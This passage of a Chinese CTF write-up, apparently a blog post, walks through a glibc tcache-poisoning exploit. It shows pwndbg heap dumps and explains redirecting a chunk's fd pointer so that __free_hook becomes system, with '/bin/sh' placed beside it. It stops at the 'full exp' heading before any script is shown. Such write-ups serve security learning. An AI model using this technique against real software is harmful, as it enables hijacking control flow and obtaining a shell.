&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;修改前&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5640fd90c5f0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x30 [  1]: 0x5640fd90c620 ◂— 0x11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x40 [  1]: 0x5640fd90c650 ◂— 0x11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x50 [  1]: 0x5640fd90c690 ◂— 0x11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x60 [  1]: 0x5640fd90c6e0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x70 [  1]: 0x5640fd90c740 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x80 [  1]: 0x5640fd90c7b0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x90 [  1]: 0x5640fd90c830 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xa0 [  1]: 0x5640fd90c8c0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xb0 [  1]: 0x5640fd90c960 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xc0 [  1]: 0x5640fd90ca10 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xd0 [  1]: 0x5640fd90cad0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe0 [  1]: 0x5640fd90cba0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x100 [  1]: 0x5640fd90c600 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;修改后申请、释放&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x20 [  1]: 0x5640fd90c700 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x30 [  1]: 0x5640fd90c620 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x40 [  2]: 0x5640fd90c600 —▸ 0x5640fd90c650 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x50 [  1]: 0x5640fd90c690 ◂— 0x11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x60 [  1]: 0x5640fd90c6e0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x70 [  1]: 0x5640fd90c740 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x80 [  1]: 0x5640fd90c7b0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x90 [  1]: 0x5640fd90c830 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xa0 [  1]: 0x5640fd90c8c0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xb0 [  1]: 0x5640fd90c960 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xc0 [  1]: 0x5640fd90ca10 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xd0 [  1]: 0x5640fd90cad0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe0 [  1]: 0x5640fd90cba0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后，我们还是通过越界，这次直接修改 chunk 的 fd 指针指向__free_hook-8, 因为 malloc 之后，会紧接着就释放 chunk，我们需要同时完成__free_hook 改写为 system，还要保证指针指向的内容是 “/bin/sh\x00”。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; bins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcachebins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x20 [  1]: 0x55bd2778d700 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x30 [  1]: 0x55bd2778d620 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x40 [  2]: 0x55bd2778d600 —▸ 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x50 [  1]: 0x55bd2778d690 ◂— 0x11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x60 [  1]: 0x55bd2778d6e0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x70 [  1]: 0x55bd2778d740 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x80 [  1]: 0x55bd2778d7b0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x90 [  1]: 0x55bd2778d830 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xa0 [  1]: 0x55bd2778d8c0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xb0 [  1]: 0x55bd2778d960 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xc0 [  1]: 0x55bd2778da10 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xd0 [  1]: 0x55bd2778dad0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe0 [  1]: 0x55bd2778dba0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; bins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcachebins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x20 [  1]: 0x55bd2778d700 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x30 [  1]: 0x55bd2778d620 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x40 [  1]: 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x50 [  1]: 0x55bd2778d690 ◂— 0x11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x60 [  1]: 0x55bd2778d6e0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x70 [  1]: 0x55bd2778d740 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x80 [  1]: 0x55bd2778d7b0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x90 [  1]: 0x55bd2778d830 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xa0 [  1]: 0x55bd2778d8c0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xb0 [  1]: 0x55bd2778d960 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xc0 [  1]: 0x55bd2778da10 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xd0 [  1]: 0x55bd2778dad0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe0 [  1]: 0x55bd2778dba0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x100 [  1]: 0x55bd2778d600 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后的效果&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tel 0x7fd5cab318e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;00:0000│ rsi 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x68732f6e69622f /* &amp;#x27;/bin/sh&amp;#x27; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01:0008│     0x7fd5cab318e8 (__free_hook) —▸ 0x7fd5ca793420 (system) &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;完整exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#完整exp&#34;&gt;#&lt;/a&gt; 完整 exp&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span 